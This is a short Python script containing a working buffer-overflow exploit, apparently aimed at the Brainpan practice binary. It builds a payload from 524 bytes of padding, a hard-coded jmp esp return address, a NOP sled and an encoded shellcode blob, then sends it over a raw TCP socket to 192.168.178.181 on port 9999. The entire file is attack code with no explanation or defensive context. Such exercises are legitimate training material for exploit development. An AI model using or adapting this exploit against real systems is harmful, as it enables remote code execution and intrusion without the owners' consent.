#!/usr/bin/env python3

import sys, socket

payload =  b""
payload += b"\xdd\xc7\xd9\x74\x24\xf4\xba\x9c\x83\xbe\x70\x5d"
payload += b"\x33\xc9\xb1\x53\x31\x55\x17\x83\xc5\x04\x03\xc9"
payload += b"\x90\x5c\x85\x0d\x7e\x22\x66\xed\x7f\x43\xee\x08"
payload += b"\x4e\x43\x94\x59\xe1\x73\xde\x0f\x0e\xff\xb2\xbb"
payload += b"\x85\x8d\x1a\xcc\x2e\x3b\x7d\xe3\xaf\x10\xbd\x62"
payload += b"\x2c\x6b\x92\x44\x0d\xa4\xe7\x85\x4a\xd9\x0a\xd7"
payload += b"\x03\x95\xb9\xc7\x20\xe3\x01\x6c\x7a\xe5\x01\x91"
payload += b"\xcb\x04\x23\x04\x47\x5f\xe3\xa7\x84\xeb\xaa\xbf"
payload += b"\xc9\xd6\x65\x34\x39\xac\x77\x9c\x73\x4d\xdb\xe1"
payload += b"\xbb\xbc\x25\x26\x7b\x5f\x50\x5e\x7f\xe2\x63\xa5"
payload += b"\xfd\x38\xe1\x3d\xa5\xcb\x51\x99\x57\x1f\x07\x6a"
payload += b"\x5b\xd4\x43\x34\x78\xeb\x80\x4f\x84\x60\x27\x9f"
payload += b"\x0c\x32\x0c\x3b\x54\xe0\x2d\x1a\x30\x47\x51\x7c"
payload += b"\x9b\x38\xf7\xf7\x36\x2c\x8a\x5a\x5f\x81\xa7\x64"
payload += b"\x9f\x8d\xb0\x17\xad\x12\x6b\xbf\x9d\xdb\xb5\x38"
payload += b"\xe1\xf1\x02\xd6\x1c\xfa\x72\xff\xda\xae\x22\x97"
payload += b"\xcb\xce\xa8\x67\xf3\x1a\x44\x6f\x52\xf5\x7b\x92"
payload += b"\x24\xa5\x3b\x3c\xcd\xaf\xb3\x63\xed\xcf\x19\x0c"
payload += b"\x86\x2d\xa2\x23\x0b\xbb\x44\x29\xa3\xed\xdf\xc5"
payload += b"\x01\xca\xd7\x72\x79\x38\x40\x14\x32\x2a\x57\x1b"
payload += b"\xc3\x78\xff\x8b\x48\x6f\x3b\xaa\x4e\xba\x6b\xbb"
payload += b"\xd9\x30\xfa\x8e\x78\x44\xd7\x78\x18\xd7\xbc\x78"
payload += b"\x57\xc4\x6a\x2f\x30\x3a\x63\xa5\xac\x65\xdd\xdb"
payload += b"\x2c\xf3\x26\x5f\xeb\xc0\xa9\x5e\x7e\x7c\x8e\x70"
payload += b"\x46\x7d\x8a\x24\x16\x28\x44\x92\xd0\x82\x26\x4c"
payload += b"\x8b\x79\xe1\x18\x4a\xb2\x32\x5e\x53\x9f\xc4\xbe"
payload += b"\xe2\x76\x91\xc1\xcb\x1e\x15\xba\x31\xbf\xda\x11"
payload += b"\xf2\xdf\x38\xb3\x0f\x48\xe5\x56\xb2\x15\x16\x8d"
payload += b"\xf1\x23\x95\x27\x8a\xd7\x85\x42\x8f\x9c\x01\xbf"
payload += b"\xfd\x8d\xe7\xbf\x52\xad\x2d"

offset = b"A"*524 + b"\xF3\x12\x17\x31" + b"\x90"*32 + payload #311712F3 = address of jmp esp in brainpan.exe

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect(("192.168.178.181", 9999))
socket.send(offset)
socket.close()
